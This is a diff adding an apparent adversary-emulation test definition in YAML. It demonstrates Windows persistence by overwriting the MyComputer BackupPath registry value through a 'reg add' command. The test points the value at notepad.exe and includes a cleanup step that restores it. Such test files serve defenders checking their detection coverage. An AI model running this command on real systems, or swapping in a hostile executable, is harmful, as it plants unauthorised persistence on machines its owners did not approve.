@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: Abusing MyComputer Disk Backup Path for Persistence
+description: |
+    Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity
+uuid: 599f3b5c-0323-44ed-bb63-4551623bf675
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1112: Modify Registry'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: abusing-mycomputer-disk-backup-path-for-persistence
+      inline: |
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "%systemroot%\system32\notepad.exe" /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath" /t REG_EXPAND_SZ /d "%SystemRoot%\system32\sdclt.exe" /f
+        executor: command_prompt
